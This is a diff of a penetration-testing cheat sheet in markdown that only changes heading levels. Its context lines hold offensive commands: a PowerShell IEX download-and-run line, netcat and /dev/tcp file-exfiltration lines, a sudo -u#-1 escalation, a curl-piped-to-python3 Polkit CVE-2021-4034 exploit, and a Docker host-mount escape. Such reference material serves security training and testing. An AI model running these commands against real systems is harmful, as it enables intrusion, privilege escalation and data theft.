@@ -54,7 +54,7 @@ gobuster vhost -u <URL> -w <WORDLIST>
 
 
 
-### REVERSE SHELLS
+## REVERSE SHELLS
 
  #### **BASH**
  
@@ -95,10 +95,10 @@ powershell IEX(New-Object Net.WebClient).DownloadString('http://<IP>/<RESOURCE>'
 
 
 
-### SHARE AND DOWNLOAD
+## SHARE AND DOWNLOAD
 
 
- #### **HTTP SERVER**
+ ### **HTTP SERVER**
  
 ```bash
 # Python3
@@ -111,13 +111,13 @@ python -m SimpleHTTPServer 80
 php -S 0.0.0.0:80
 ```
 
- #### **SMB** 
+ ### **SMB** 
  
 ```bash
 smbserver.py shareName $(pwd) -smb2support
 ```
 
- #### **FILE TRANSFER ( NETCAT - BASH )** 
+ ### **FILE TRANSFER ( NETCAT - BASH )** 
  
 ```bash
 # Listen
@@ -128,7 +128,7 @@ cat <FILE> | nc <IP> <PORT>  # Netcat
 cat <FILE> > /dev/tcp/<IP>/<PORT>  # Bash
 ```
 
- #### **DOWNLOAD** 
+ ### **DOWNLOAD** 
 
  Powershell
  
@@ -150,7 +150,7 @@ wget "http://<IP>/"
 
 
 
-### SYSTEM ENUMERATION
+## SYSTEM ENUMERATION
 
 
  #### **Enviroment Variables**
@@ -216,9 +216,9 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
- #### **Sudo**
+ ### **Sudo**
 
 ```bash
 # List user privileges
@@ -231,7 +231,7 @@ sudo -V | grep "Sudo ver"
 sudo -u#-1 /bin/bash
 ```
 
- #### **Polkit - (CVE-2021-4034)**
+ ### **Polkit - (CVE-2021-4034)**
 
 ```bash
 # Check pkexec permissions
@@ -241,7 +241,7 @@ ls -l $(which pkexec)
 curl -L https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py | python3
 ```
  
- #### **Docker**
+ ### **Docker**
  
 ```bash
 docker run -it --rm -v /:/mnt alpine chroot /mnt sh
